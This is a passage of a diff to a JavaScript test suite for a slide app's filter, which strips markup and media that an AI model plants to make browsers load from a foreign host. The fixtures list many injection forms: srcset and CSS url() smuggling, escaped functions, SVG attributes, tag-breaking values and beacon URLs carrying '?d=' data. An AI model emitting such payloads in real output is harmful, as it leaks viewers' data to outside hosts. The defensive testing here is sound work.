@@ -16,6 +16,13 @@
  * browser would fetch: string checks on an answer miss what the renderer and
  * the funnel make of it.
  *
+ * Two loads are not a media field (DY-863), and the planted set carries both
+ * onto every path that can reach them: markup in a text a type from the
+ * database renders as markup (and a text it writes into an attribute), and a
+ * bare video id with a Bunny library of the model's own (`ai: false`). The
+ * conversion path offers no type from the database, so it carries only the
+ * backgrounds.
+ *
  * The list of paths is closed against the transport: a new file that imports
  * it fails the inventory test until it is filed below as a path that writes
  * slide content (with a test) or one that does not.
@@ -33,6 +40,8 @@ import { Readable } from 'node:stream';
 import { fileURLToPath } from 'node:url';
 import { JSDOM } from 'jsdom';
 import { userIdFor, userRows } from './helpers/identity-fixtures.js';
+import { callArguments } from './helpers/call-sites.js';
+import { walkFiles } from './helpers/walk-files.js';
 import { brandSeedRow } from './helpers/theme-seed.js';
 import { createMockReq, createMockRes } from './helpers/http-mocks.js';
 
@@ -131,6 +140,46 @@ const refusedByTheParser = () =>
 const HELD_IMAGE = 'https://bucket.s3.test/uploads/held.png';
 const HELD_EMBED = 'https://dashboard.example/board';
 
+/**
+ * A type from the database that renders text as markup (DY-863): `body` goes
+ * in as it is, `photo` into an attribute, and the template loads a mark of
+ * its own from a host the installation chose.
+ */
+const NOTES_TYPE = 'custom-notes';
+const INSTALLATION_MARK = 'https://cdn.installation.test/mark.png';
+function notesTypeRow() {
+  return {
+    id: 'cst-notes',
+    organization_id: ORG,
+    slug: 'notes',
+    label: 'Notes',
+    base_type: null,
+    fields: [
+      { key: 'title', type: 'string', label: 'Title', maxLength: 200 },
+      { key: 'body', type: 'string', label: 'Body', maxLength: 4000 },
+      { key: 'photo', type: 'string', label: 'Photo', maxLength: 400 },
+    ],
+    defaults: { title: '', body: '', photo: '' },
+    defaults_by_lang: null,
+    template:
+      '<div class="slide"><h2>{{esc title}}</h2><div class="body">{{raw body}}</div>' +
+      '{{#if photo}}<img src="{{esc photo}}" alt="">{{/if}}' +
+      `<img class="mark" src="${INSTALLATION_MARK}" alt=""></div>`,
+    css: null,
+    usage: null,
+    is_published: true,
+    sort_order: 0,
+    created_at: '2026-11-06T00:00:00.000Z',
+    updated_at: '2026-11-06T00:00:00.000Z',
+    created_by: null,
+  };
+}
+
+/** Markup a model writes in a text the type renders as markup. */
+const PLANTED_MARKUP = `<p>Seen this year.</p><img src="${IMAGE}" alt="">`;
+/** A Bunny library the installation did not choose, for a bare video id. */
+const PLANTED_LIBRARY = 'planted-library';
+
 const { createFakeDb } = await import('./helpers/fake-db.js');
 const { __setTestDb } = await import('../server/db/client.js');
 const { initializeStorage } = await import('../server/db/lifecycle.js');
@@ -151,10 +200,29 @@ const { analyzePresentation } =
 const { generateDeck } = await import('../server/utils/ai/generate-deck.js');
 const { createPresentation } =
   await import('../server/services/presentations.js');
-const { dropForeignMedia, leaveOut, loadsFromAnotherHost, mediaInSlides } =
-  await import('../server/utils/ai/model-media.js');
+const {
+  dropForeignMedia,
+  leaveOut,
+  loadsFromAnotherHost,
+  heldInSlides,
+  MAX_SEARCH_CHARS,
+} = await import('../server/utils/ai/model-media.js');
 const { SLIDE_TYPES, canonicalSlideType } =
   await import('../shared/slide-types/registry.js');
+const { toRuntimeSlideType } =
+  await import('../server/utils/custom-slide-type-runtime.js');
+const { loadSurfaces } = await import('../server/utils/ai/model-media.js');
+const { loadSlideTypeOffer } =
+  await import('../server/utils/org-slide-types.js');
+
+/** Core plus the type from the database, as an org's merged map holds it. */
+const TYPES = {
+  ...SLIDE_TYPES,
+  [NOTES_TYPE]: toRuntimeSlideType({
+    ...notesTypeRow(),
+    baseType: null,
+  }),
+};
 const { newSlide, renderSlideHtml } =
   await import('../shared/slide-types/presentation.js');
 const { mediaValue } = await import('../shared/slide-types/helpers.js');
@@ -197,6 +265,7 @@ async function setup() {
     organizations: [{ id: ORG, name: 'Default', slug: 'default' }],
     users: userRows(OWNER),
     themes: [brand],
+    custom_slide_types: [notesTypeRow()],
     presentations: [],
     api_usage_daily: [],
   });
@@ -315,6 +384,23 @@ const planted = () => [
     },
     why: 'White space.',
   },
+  // Beyond the media fields (DY-863): markup in a text a type from the
+  // database renders as markup and in an attribute, and a bare video id
+  // with a Bunny library of the model's own.
+  {
+    type: NOTES_TYPE,
+    content: { title: 'Notes', body: PLANTED_MARKUP, photo: IMAGE },
+    why: 'Markup.',
+  },
+  {
+    type: 'video-slide',
+    content: {
+      title: 'A library film',
+      source: 'a-bare-video-id',
+      bunnyLibraryId: PLANTED_LIBRARY,
+    },
+    why: 'A library.',
+  },
   // A background the rule reads as a path on this host: it stays, and must
   // load nothing, because the layer writes what the rule read. And one the
   // URL parser refuses, which a CSS url() loads anyway: it is emptied.
@@ -329,9 +415,13 @@ const planted = () => [
   })),
 ];
 
+/** Whether a planted slide loses what its type requires. */
+const losesItsSource = (s) =>
+  ['embed-slide', 'video-slide'].includes(s.type) &&
+  s.content.source !== 'a-bare-video-id';
+
 /** The planted slides that can be stored once their media is gone. */
-const plantedThatStay = () =>
-  planted().filter((s) => !['embed-slide', 'video-slide'].includes(s.type));
+const plantedThatStay = () => planted().filter((s) => !losesItsSource(s));
 
 /**
  * No string anywhere in `value` mentions the planted host, except exactly the
@@ -370,9 +460,59 @@ const URL_ATTRIBUTES = [
   'src',
   'srcset',
   'poster',
+  'background',
   'data-embed-url',
   'data-src',
 ];
+
+/** Attributes a browser reads as CSS. */
+const CSS_ATTRIBUTES = [
+  'style',
+  'fill',
+  'stroke',
+  'filter',
+  'mask',
+  'clip-path',
+  'marker-start',
+  'marker-mid',
+  'marker-end',
+  'cursor',
+];
+
+/** Attributes that load on render except on a link, where they wait for a click. */
+const HREF_ATTRIBUTES = ['href', 'xlink:href'];
+
+/**
+ * The candidate URLs of a `srcset`, split the way the HTML standard splits
+ * it: a URL is a run without white space (trailing commas dropped), and its
+ * descriptors end at a comma outside parentheses, so `/a.png 1x,https://h/b`
+ * is two candidates (Chrome fetches the second, review of DY-863).
+ */
+function srcsetUrls(value) {
+  const urls = [];
+  const space = /[\t\n\f\r ]/;
+  let i = 0;
+  while (i < value.length) {
+    while (i < value.length && (space.test(value[i]) || value[i] === ',')) {
+      i += 1;
+    }
+    const start = i;
+    while (i < value.length && !space.test(value[i])) i += 1;
+    const url = value.slice(start, i);
+    if (!url) break;
+    urls.push(url.replace(/,+$/, ''));
+    if (url.endsWith(',')) continue;
+    for (let depth = 0; i < value.length; i += 1) {
+      if (value[i] === '(') depth += 1;
+      else if (value[i] === ')') depth = Math.max(0, depth - 1);
+      else if (value[i] === ',' && depth === 0) {
+        i += 1;
+        break;
+      }
+    }
+  }
+  return urls;
+}
 
 /**
  * Every address the rendered HTML makes a browser fetch or frame, read the
@@ -392,14 +532,26 @@ function addressesIn(html) {
     for (const name of URL_ATTRIBUTES) {
       const value = el.getAttribute(name);
       if (value == null) continue;
-      if (name === 'srcset') {
-        attributes.push(
-          ...value.split(/,\s+/).map((part) => part.trim().split(/\s+/)[0]),
-        );
-      } else attributes.push(value);
+      if (name === 'srcset') attributes.push(...srcsetUrls(value));
+      else attributes.push(value);
     }
-    const style = el.getAttribute('style');
-    if (style) css.push(...cssAddresses(style));
+    if (!['a', 'area'].includes(el.localName)) {
+      for (const name of HREF_ATTRIBUTES) {
+        const value = el.getAttribute(name);
+        if (value != null) attributes.push(value);
+      }
+    }
+    if (el.localName === 'template') {
+      const inner = addressesIn(el.innerHTML);
+      attributes.push(...inner.attributes);
+      css.push(...inner.css);
+    }
+    // CSS: `style`, and an SVG presentation attribute that takes a `url()`
+    // (Chrome fetches `fill="url(https://…#p)"`, probe K).
+    for (const name of CSS_ATTRIBUTES) {
+      const value = el.getAttribute(name);
+      if (value != null) css.push(...cssAddresses(value));
+    }
     if (el.localName === 'style') css.push(...cssAddresses(el.textContent));
   }
   return { attributes, css };
@@ -506,15 +658,12 @@ function resolvesToPlantedHost(address) {
 /**
  * Whether a CSS `url()` or string with this address loads from the planted
  * host. One the URL parser refuses on a base, Chrome still fetches from the
- * host it names; no parser in Node does what Chrome does there, so an address
- * that names the host and does not parse counts as a load (the conservative
- * reading).
+ * host it names, and no parser in Node does what Chrome does there: so every
+ * address that does not parse on both bases counts as a load, whether or not
+ * it spells the host (the conservative reading; DY-811 review 4).
  */
 function cssLoadsPlantedHost(address) {
-  return (
-    resolvesToPlantedHost(address) ||
-    (address.includes(HOST) && !parsesOnEveryBase(address))
-  );
+  return resolvesToPlantedHost(address) || !parsesOnEveryBase(address);
 }
 
 /** The addresses in `html` a browser loads from the planted host. */
@@ -533,7 +682,7 @@ function plantedLoads(html) {
 function assertRendersNothingPlanted(slides, where) {
   const deck = migratePresentation({ slides: structuredClone(slides) });
   for (const slide of deck.slides) {
-    const loads = plantedLoads(renderSlideHtml(slide));
+    const loads = plantedLoads(renderSlideHtml(slide, { slideTypes: TYPES }));
     assert.deepEqual(loads, [], `${where}: ${slide.type} loads ${loads}`);
   }
 }
@@ -555,10 +704,28 @@ function assertPlantedTypes(slides, where) {
   const added = slides.filter((s) => s.content?.title !== 'Board');
   for (const type of ['embed-slide', 'video-slide']) {
     assert.ok(
-      !added.some((s) => s.type === type),
+      !added.some(
+        (s) =>
+          s.type === type &&
+          !mediaValue(s.content.source ?? s.content.embedUrl),
+      ),
       `${where}: a ${type} without its source came back`,
     );
   }
+  // Beyond the media fields (DY-863).
+  const notes = slides.find((s) => s.type === NOTES_TYPE);
+  assert.ok(
+    notes,
+    `${where}: no ${NOTES_TYPE} came back, so this proves nothing`,
+  );
+  assert.equal(notes.content.title, 'Notes', `${where}: the title stays`);
+  const film = slides.find((s) => s.content?.source === 'a-bare-video-id');
+  assert.ok(film, `${where}: the library film did not come back`);
+  assert.equal(
+    film.content.bunnyLibraryId || '',
+    '',
+    `${where}: the film plays from the installation's library`,
+  );
 }
 
 /** A slide that stays carries the notice about the ones left out. */
@@ -691,8 +858,8 @@ test('a media field keeps what was held and what names no other host', () => {
       content: { images: [{ src: IMAGE }, { src: HELD_IMAGE }] },
     },
   ];
-  const keep = mediaInSlides(heldSlides(), SLIDE_TYPES);
-  assert.deepEqual([...keep].sort(), [HELD_EMBED, HELD_IMAGE].sort());
+  const keep = heldInSlides(heldSlides(), SLIDE_TYPES);
+  assert.deepEqual([...keep.media].sort(), [HELD_EMBED, HELD_IMAGE].sort());
   const unusable = dropForeignMedia(slides, { slideTypes: SLIDE_TYPES, keep });
 
   // The planted embed and video lost what their type requires; an image
@@ -724,7 +891,7 @@ test('a held embed is not a held image: the kinds do not mix up by value', () =>
   const slides = [{ type: 'image-slide', content: { image: HELD_EMBED } }];
   dropForeignMedia(slides, {
     slideTypes: SLIDE_TYPES,
-    keep: mediaInSlides(heldSlides(), SLIDE_TYPES),
+    keep: heldInSlides(heldSlides(), SLIDE_TYPES),
   });
   assert.equal(slides[0].content.image, HELD_EMBED);
 });
@@ -750,6 +917,746 @@ test('a type named by its published id is read off its declaration', () => {
   const slides = [{ type: published, content: { embedUrl: EMBED } }];
   dropForeignMedia(slides, { slideTypes: SLIDE_TYPES });
   assert.equal(slides[0].content.embedUrl, '');
+});
+
+// ── Beyond the media fields (DY-863) ────────────────────────────────────────
+
+/**
+ * Every way markup a model writes in a text a template renders as markup can
+ * make a viewer's browser load from the planted host, after the sanitizer.
+ * Each one the oracle sees unguarded (the test below proves it).
+ */
+const PLANTED_MARKUP_FORMS = {
+  'an image': `<img src="${IMAGE}">`,
+  'an image behind a character reference': `<img src="&#x68;ttps://${HOST}/p.png?d=x">`,
+  'an image set': `<img srcset="/own.png 1x, ${IMAGE} 2x">`,
+  'a picture source': `<picture><source srcset="${IMAGE}"><img src="/own.png"></picture>`,
+  'a video poster': `<video poster="${IMAGE}"></video>`,
+  'a video source': `<video><source src="${VIDEO}"></video>`,
+  'an SVG image': `<svg><image href="${IMAGE}"></image></svg>`,
+  'an SVG image by xlink': `<svg><image xlink:href="${IMAGE}"></image></svg>`,
+  'an SVG filter image': `<svg><filter id="f"><feImage href="${IMAGE}"></feImage></filter></svg>`,
+  'a table background': `<table background="${IMAGE}"><tr><td>x</td></tr></table>`,
+  'a style background': `<div style="background-image: url(${IMAGE})">x</div>`,
+  'a style background, escaped': `<div style="background-image: u\\72l(${IMAGE})">x</div>`,
+  'a style background in capitals': `<div style="background-image: URL(${IMAGE})">x</div>`,
+  'a style image set': `<div style="background-image: image-set('${IMAGE}' 1x)">x</div>`,
+  'a style background behind a comment': `<div style="background: url/**/(${IMAGE})">x</div>`,
+  'an SVG fill': `<svg><rect fill="url(${IMAGE}#p)" width="1" height="1"></rect></svg>`,
+  'an embed a runtime frames': `<div class="embed-frame" data-embed-url="${EMBED}"></div>`,
+  'a refused CSS address': `<div style="background: url(https://${HOST}：/p.png)">x</div>`,
+};
+
+/**
+ * A form the rule refuses without a browser loading it: a comment between
+ * `url` and `(` makes no function. The rule reads CSS conservatively (a
+ * comment or an escape counts, and so does any function it does not know).
+ */
+const REFUSED_THOUGH_CHROME_LOADS_NOTHING = new Set([
+  'a style background behind a comment',
+]);
+
+/** A notes slide with these values, as a model hands it back. */
+const notesSlide = (content) => ({
+  type: NOTES_TYPE,
+  content: { title: 'Notes', body: '', photo: '', ...content },
+});
+
+const plantedNotesLoads = (slide) =>
+  plantedLoads(renderSlideHtml(slide, { slideTypes: TYPES }));
+
+test('markup a type renders as markup loads nothing a model planted, in any form', () => {
+  for (const [form, body] of Object.entries(PLANTED_MARKUP_FORMS)) {
+    const unguarded = notesSlide({ body });
+    assert.equal(
+      plantedNotesLoads(unguarded).length > 0,
+      !REFUSED_THOUGH_CHROME_LOADS_NOTHING.has(form),
+      `${form}: the render oracle does not see what the slide loads unguarded`,
+    );
+    const slide = notesSlide({ body });
+    dropForeignMedia([slide], { slideTypes: TYPES });
+    assert.equal(slide.content.body, '', `${form}: the markup is emptied`);
+    assert.equal(slide.content.title, 'Notes', `${form}: the title stays`);
+    assert.match(slide._aiWarnings[0], /load something from another host/);
+    assert.deepEqual(plantedNotesLoads(slide), [], form);
+  }
+});
+
+test('a text the template writes into an attribute loads nothing a model planted', () => {
+  for (const form of Object.keys(HOSTILE_FORMS)) {
+    const photo = hostile(form, IMAGE);
+    if (typeof photo !== 'string') continue;
+    const slide = notesSlide({ photo });
+    dropForeignMedia([slide], { slideTypes: TYPES });
+    assert.deepEqual(plantedNotesLoads(slide), [], form);
+  }
+  const slide = notesSlide({ photo: IMAGE });
+  dropForeignMedia([slide], { slideTypes: TYPES });
+  assert.equal(slide.content.photo, '');
+});
+
+test('markup that loads nothing, a link and what the template loads itself stay', () => {
+  const body =
+    '<p><strong>Seen</strong> <span style="color: rgb(200, 0, 0)">this year</span>.</p>' +
+    `<p><a href="https://${HOST}/read">Read more</a></p><img src="/uploads/own.png" alt="">`;
+  const slide = notesSlide({ body, photo: '/uploads/own.png' });
+  dropForeignMedia([slide], { slideTypes: TYPES });
+  assert.equal(slide.content.body, body);
+  assert.equal(slide.content.photo, '/uploads/own.png');
+  assert.equal(slide._aiWarnings, undefined);
+  const html = renderSlideHtml(slide, { slideTypes: TYPES });
+  assert.ok(html.includes(INSTALLATION_MARK), 'the template keeps its mark');
+});
+
+test("markup the slides held in that field stays; moved elsewhere it is the model's", () => {
+  const shown = [notesSlide({ body: PLANTED_MARKUP })];
+  const keep = heldInSlides(shown, TYPES);
+  const handedBack = notesSlide({ body: PLANTED_MARKUP, title: 'Shorter' });
+  dropForeignMedia([handedBack], { slideTypes: TYPES, keep });
+  assert.equal(handedBack.content.body, PLANTED_MARKUP, 'a person wrote it');
+
+  // The same text, written as prose on a core slide, renders as text there;
+  // moved into the field that renders it as markup, it would load.
+  const fromProse = heldInSlides(
+    [{ type: 'content-slide', content: { title: 'x', body: PLANTED_MARKUP } }],
+    TYPES,
+  );
+  const moved = notesSlide({ body: PLANTED_MARKUP });
+  dropForeignMedia([moved], { slideTypes: TYPES, keep: fromProse });
+  assert.equal(moved.content.body, '');
+});
+
+test('a value split over two texts is emptied until the slide loads nothing', () => {
+  const split = toRuntimeSlideType({
+    id: 'cst-split',
+    slug: 'split',
+    label: 'Split',
+    fields: [
+      { key: 'scheme', type: 'string', label: 'a' },
+      { key: 'rest', type: 'string', label: 'b' },
+      { key: 'title', type: 'string', label: 'c' },
+    ],
+    defaults: {},
+    template:
+      '<div class="slide"><h2>{{esc title}}</h2><img src="{{esc scheme}}{{esc rest}}" alt=""></div>',
+  });
+  const types = { ...TYPES, 'custom-split': split };
+  const slide = {
+    type: 'custom-split',
+    content: { scheme: 'https:', rest: `//${HOST}/p.png?d=x`, title: 'Kept' },
+  };
+  dropForeignMedia([slide], { slideTypes: types });
+  assert.equal(slide.content.title, 'Kept');
+  assert.ok(
+    !slide.content.scheme || !slide.content.rest,
+    'one half of the address is gone',
+  );
+  assert.deepEqual(
+    plantedLoads(renderSlideHtml(slide, { slideTypes: types })),
+    [],
+  );
+});
+
+test('a number the template writes into an address is judged like a text', () => {
+  const host = toRuntimeSlideType({
+    id: 'cst-host',
+    slug: 'host',
+    label: 'Host',
+    fields: [{ key: 'n', type: 'number', label: 'n' }],
+    defaults: {},
+    template:
+      '<div class="slide"><img src="https://{{esc n}}/p.png" alt=""></div>',
+  });
+  const types = { ...TYPES, 'custom-host': host };
+  const slide = { type: 'custom-host', content: { n: 2130706433 } };
+  dropForeignMedia([slide], { slideTypes: types });
+  assert.equal(Object.hasOwn(slide.content, 'n'), false);
+});
+
+test('a render that throws empties every text the model wrote', () => {
+  const broken = toRuntimeSlideType({
+    id: 'cst-broken',
+    slug: 'broken',
+    label: 'Broken',
+    fields: [{ key: 'title', type: 'string', label: 't' }],
+    defaults: {},
+    template: '<div class="slide">{{esc title}}</div>',
+  });
+  broken.renderHtml = () => {
+    throw new Error('no');
+  };
+  const types = { ...TYPES, 'custom-broken': broken };
+  const slide = { type: 'custom-broken', content: { title: PLANTED_MARKUP } };
+  dropForeignMedia([slide], { slideTypes: types });
+  assert.equal(slide.content.title, '');
+});
+
+test('the load reader counts what loads and nothing that does not', () => {
+  const count = (html) =>
+    [...loadSurfaces(html).values()].reduce((a, b) => a + b, 0);
+  assert.equal(
+    count('<img src="/own.png"><a href="https://x.example/">l</a>'),
+    0,
+  );
+  assert.equal(
+    count('<div style="width: calc(100% - 2rem); color: red">x</div>'),
+    0,
+  );
+  assert.equal(
+    count('<div style="background: linear-gradient(red, blue)">x</div>'),
+    0,
+  );
+  assert.equal(count(`<img src="${IMAGE}">`), 1);
+  assert.equal(
+    count('<div style="background: url(/own.png)">x</div>'),
+    1,
+    'any url() counts',
+  );
+  assert.equal(
+    count('<div style="x: \\75 rl(/own.png)">x</div>'),
+    1,
+    'an escaped function name counts',
+  );
+  // An escape or a comment counts even inside a function that loads nothing:
+  // either can spell a name the reader does not see.
+  assert.equal(count('<div style="width: calc(1px \\9)">x</div>'), 1);
+  assert.equal(count('<div style="color: red /* x */">x</div>'), 1);
+  assert.equal(count(`<template><img src="${IMAGE}"></template>`), 1);
+});
+
+test("a field the type keeps from the model gets the installation's value back", () => {
+  const configured = {
+    ...TYPES,
+    'video-slide': {
+      ...TYPES['video-slide'],
+      defaults: { ...TYPES['video-slide'].defaults, bunnyLibraryId: '424242' },
+    },
+  };
+  const film = () => ({
+    type: 'video-slide',
+    content: {
+      title: 'A film',
+      source: 'a-bare-video-id',
+      bunnyLibraryId: PLANTED_LIBRARY,
+      transcript: 'An invented transcript.',
+      watchUrl: `https://${HOST}/watch`,
+    },
+  });
+  const slide = film();
+  dropForeignMedia([slide], { slideTypes: configured });
+  assert.equal(slide.content.bunnyLibraryId, '424242');
+  assert.equal(slide.content.transcript, '');
+  assert.equal(slide.content.watchUrl, '');
+  assert.equal(slide.content.source, 'a-bare-video-id');
+  assert.match(slide._aiWarnings.join(' '), /left to people/);
+
+  // What the shown slide held there stays: a person chose it.
+  const shown = film();
+  const kept = film();
+  dropForeignMedia([kept], {
+    slideTypes: configured,
+    keep: heldInSlides([shown], configured),
+  });
+  assert.equal(kept.content.bunnyLibraryId, PLANTED_LIBRARY);
+  assert.equal(kept.content.transcript, 'An invented transcript.');
+});
+
+// ── Review of DY-863: formulas, media in a template, the cost ───────────────
+
+/**
+ * Prose a model writes in any text field of core. None of it loads anything:
+ * a formula renders through KaTeX without `trust`, a path with backslashes
+ * and a function call in a code block are text.
+ */
+const HARMLESS_PROSE = {
+  plain: 'Groei in het derde kwartaal',
+  parentheses: 'Omzet (2024) steeg met 4%',
+  'a URL in a sentence':
+    'Bron: https://www.cbs.nl/nl-nl/cijfers en eigen onderzoek',
+  'a Windows path': 'Pad C:\\Users\\jan',
+  'a comment marker': 'Let op /* dit */ niet',
+  'a markdown link': 'Lees [het rapport](https://www.cbs.nl/rapport) na',
+  'a code block': '```js\nconsole.log(fn(1))\n```',
+  'a formula with a function': 'Dan $f(x) = x^2$ en verder',
+  'a fraction': 'De energie $\\frac{1}{2}mv^2$',
+  'a root': 'De wortel is $\\sqrt{x}$ en $a^2$',
+  'a block formula': 'Formule:\n\n$$\\frac{a}{b}$$\n',
+  'a block formula with an integral': '$$\\int_0^1 x\\,dx$$',
+  'a line break in a formula': '$$a \\\\ b \\\\c$$',
+  'prices that are no formula': 'Kosten: $5 en $10 per stuk (excl. btw)',
+};
+
+const PROSE_TYPES = new Set(['string', 'markdown', 'csv', 'text', 'richtext']);
+
+/** Every free text field of a type, as a path into its content. */
+function* proseFields(fields, prefix = []) {
+  for (const field of fields || []) {
+    if (field.type === 'items') {
+      yield* proseFields(field.itemFields, [...prefix, field.key]);
+    } else if (
+      PROSE_TYPES.has(field.type) &&
+      field.ai !== false &&
+      !field.mediaRef &&
+      !Array.isArray(field.options)
+    ) {
+      yield [...prefix, field.key];
+    }
+  }
+}
+
+/** Put `value` at `keys` in a new slide's content, a list entry made if needed. */
+function proseSlide(type, keys, value) {
+  const slide = newSlide({ type, slideTypes: SLIDE_TYPES });
+  let holder = slide.content;
+  for (const key of keys.slice(0, -1)) {
+    if (!Array.isArray(holder[key]) || typeof holder[key][0] !== 'object') {
+      holder[key] = [{}];
+    }
+    holder = holder[key][0];
+  }
+  holder[keys.at(-1)] = value;
+  return { slide, read: () => holder[keys.at(-1)] };
+}
+
+test('prose and formulas a model writes in core stay, in every text field', () => {
+  let fields = 0;
+  const emptied = [];
+  for (const [type, def] of Object.entries(SLIDE_TYPES)) {
+    for (const keys of proseFields(def.fields)) {
+      fields += 1;
+      for (const [form, text] of Object.entries(HARMLESS_PROSE)) {
+        const { slide, read } = proseSlide(type, keys, text);
+        dropForeignMedia([slide], { slideTypes: SLIDE_TYPES });
+        if (read() !== text) emptied.push(`${type} ${keys.join('.')}: ${form}`);
+      }
+    }
+  }
+  assert.ok(fields > 200, `the sweep reaches the text fields (${fields})`);
+  assert.deepEqual(emptied, []);
+});
+
+test('a formula is read as a formula, any other runtime attribute as addresses', () => {
+  const count = (html) =>
+    [...loadSurfaces(html).values()].reduce((a, b) => a + b, 0);
+  assert.equal(count('<span data-math="f(x) \\\\c \\url{x}">f</span>'), 0);
+  assert.equal(count('<span data-note="\\\\c">x</span>'), 1, 'reads as //c');
+  assert.equal(count(`<span data-note="a ${IMAGE}">x</span>`), 1);
+  assert.equal(count('<span title="f(x)" data-x="f(x)">x</span>'), 0);
+  assert.equal(
+    count(`<svg><rect fill="url(/own.svg#p)" width="1"></rect></svg>`),
+    1,
+    'an SVG attribute is CSS',
+  );
+});
+
+test('KaTeX renders formulas without trust, so data-math loads nothing', () => {
+  // The render rule reads `data-math` as inert because KaTeX without `trust`
+  // renders `\href`, `\includegraphics` and `\url` as text. A call that
+  // passes `trust` (or a renderer of formulas this does not know) makes
+  // that false: then the rule must read the formula as an address.
+  const calls = [];
+  for (const dir of ['client', 'shared', 'server']) {
+    for (const file of walkFiles(path.join(REPO_ROOT, dir), {
+      extensions: ['.js'],
+      skipDirs: ['vendor'],
+    })) {
+      const source = readFileSync(file, 'utf8');
+      const where = path.relative(REPO_ROOT, file);
+      for (const fn of ['katex\\.render', 'katex\\.renderToString']) {
+        for (const args of callArguments(source, fn))
+          calls.push({ where, args });
+      }
+      assert.doesNotMatch(
+        source,
+        /\btrust\s*:/,
+        `${where} sets a trust option`,
+      );
+    }
+  }
+  assert.deepEqual(
+    calls.map((call) => call.where),
+    [
+      'client/lib/slide-runtime/slide-render.js',
+      'client/lib/slide-runtime/slide-render.js',
+      'server/utils/prism-katex.js',
+      'server/utils/prism-katex.js',
+    ],
+    'every KaTeX call is a runtime that renders data-math (the editor, the export page)',
+  );
+  for (const { where, args } of calls) {
+    assert.equal(args.length, 3, where);
+    assert.match(args[2], /^\{[\s\S]*\}$/, `${where}: options inline`);
+    assert.doesNotMatch(args[2], /trust|\.\.\./, where);
+  }
+});
+
+/**
+ * Templates of a type from the database that put their own image field where
+ * a browser reads more than one address (review of DY-863, probe M).
+ */
+const MEDIA_TEMPLATES = {
+  'a quoted CSS url()': `<div class="slide" style="background-image:url('{{esc photo}}')"><h2>{{esc title}}</h2></div>`,
+  'a bare CSS url()': `<div class="slide" style="background-image:url({{esc photo}})"><h2>{{esc title}}</h2></div>`,
+  'a double-quoted CSS url()': `<div class="slide" style='background-image:url("{{esc photo}}")'><h2>{{esc title}}</h2></div>`,
+  'an image with a srcset': `<div class="slide"><h2>{{esc title}}</h2><img src="{{esc photo}}" srcset="{{esc photo}} 2x" alt=""></div>`,
+  'a picture source': `<div class="slide"><h2>{{esc title}}</h2><picture><source srcset="{{esc photo}}"><img src="/own.png" alt=""></picture></div>`,
+  'a srcset with width variants': `<div class="slide"><h2>{{esc title}}</h2><img src="/own.png" srcset="{{esc photo}}?w=800 800w, {{esc photo}}?w=1600 1600w" sizes="100vw" alt=""></div>`,
+  'a srcset, second candidate': `<div class="slide"><h2>{{esc title}}</h2><img src="/own.png" srcset="/own.png 1x, {{esc photo}} 2x" alt=""></div>`,
+  'an image': `<div class="slide"><h2>{{esc title}}</h2><img src="{{esc photo}}" alt=""></div>`,
+  'an image without quotes, raw': `<div class="slide"><h2>{{esc title}}</h2><img alt="" src={{raw photo}}></div>`,
+  'raw as markup': `<div class="slide"><h2>{{esc title}}</h2><p>{{raw photo}}</p></div>`,
+  'a srcset, raw': `<div class="slide"><h2>{{esc title}}</h2><img src="/own.png" srcset="{{raw photo}}" alt=""></div>`,
+};
+
+/** Own paths that end a CSS string or `url()`, or split a `srcset`. */
+const SECOND_ADDRESS_FORMS = {
+  'an apostrophe, a second layer': `/own.png'), url('${IMAGE}`,
+  'a parenthesis, a second layer': `/own.png), url(${IMAGE}`,
+  'a double quote, a second layer': `/own.png"), url("${IMAGE}`,
+  'a line feed, a second layer': `/own.png')\n, url('${IMAGE}`,
+  'a CSS escape in the own path': `/own.png\\'), url(\\'${IMAGE}`,
+  'a second srcset candidate': `/own.png 1x, ${IMAGE}`,
+  'a srcset candidate behind a comma': `/own.png 1x,${IMAGE}`,
+  'a srcset candidate behind a tab': `/own.png\t1x,${IMAGE}`,
+  'a leading comma': `,${IMAGE}`,
+  'a leading comma, scheme-relative': `,//${HOST}/pixel.png?d=deck-text`,
+  'two leading commas': `,,${IMAGE}`,
+  'markup without space or quote': `<img/src=//${HOST}/pixel.png?d=deck-text>`,
+  'closes the tag, markup follows': `/own.png><img/src=//${HOST}/pixel.png?d=deck-text>`,
+  'a character reference for the space': `/own.png&#32;1x,&#32;${IMAGE}`,
+};
+
+/** What a model may write in a media field the slides did not hold. */
+const ONE_ADDRESS_FORMS = {
+  'an own path': '/uploads/x.png',
+  'an own path with a query': '/uploads/x.png?w=800',
+  'a png as data': 'data:image/png;base64,iVBORw0KGgo=',
+  'an svg as data, percent-encoded':
+    'data:image/svg+xml,%3Csvg%20xmlns=%22http://www.w3.org/2000/svg%22/%3E',
+};
+
+function heroTypes(template) {
+  const def = toRuntimeSlideType({
+    id: 'cst-hero',
+    slug: 'hero',
+    label: 'Hero',
+    fields: [
+      { key: 'title', type: 'string', label: 'Title' },
+      { key: 'photo', type: 'image', label: 'Photo' },
+    ],
+    defaults: { title: '', photo: '' },
+    template,
+  });
+  return { ...TYPES, 'custom-hero': def };
+}
+
+test("a database type's image field loads one address on this host, wherever the template puts it", () => {
+  for (const [where, template] of Object.entries(MEDIA_TEMPLATES)) {
+    const types = heroTypes(template);
+    const hero = (photo) => ({
+      type: 'custom-hero',
+      content: { title: 'Hero', photo },
+    });
+    for (const [form, photo] of Object.entries(SECOND_ADDRESS_FORMS)) {
+      // Held, a person wrote it: the oracle sees the second address where
+      // the template gives it one (the image alone reads one address).
+      const held = hero(photo);
+      dropForeignMedia([held], {
+        slideTypes: types,
+        keep: heldInSlides([hero(photo)], types),
+      });
+      assert.equal(held.content.photo, photo, `${where}, ${form}: held`);
+      const slide = hero(photo);
+      dropForeignMedia([slide], { slideTypes: types });
+      assert.equal(slide.content.photo, '', `${where}, ${form}`);
+      assert.equal(slide.content.title, 'Hero');
+      assert.deepEqual(
+        plantedLoads(renderSlideHtml(slide, { slideTypes: types })),
+        [],
+        `${where}, ${form}`,
+      );
+    }
+    for (const [form, photo] of Object.entries(ONE_ADDRESS_FORMS)) {
+      const own = hero(photo);
+      dropForeignMedia([own], { slideTypes: types });
+      assert.equal(own.content.photo, photo, `${where}: ${form}`);
+      assert.equal(own._aiWarnings, undefined, `${where}: ${form}`);
+    }
+    const own = hero('/uploads/x.png');
+    dropForeignMedia([own], { slideTypes: types });
+    assert.ok(
+      renderSlideHtml(own, { slideTypes: types }).includes('/uploads/x.png'),
+    );
+  }
+  // The oracle reads the second address in the templates that give one.
+  const srcset = heroTypes(MEDIA_TEMPLATES['an image with a srcset']);
+  const glued = {
+    type: 'custom-hero',
+    content: {
+      title: 'x',
+      photo: SECOND_ADDRESS_FORMS['a srcset candidate behind a comma'],
+    },
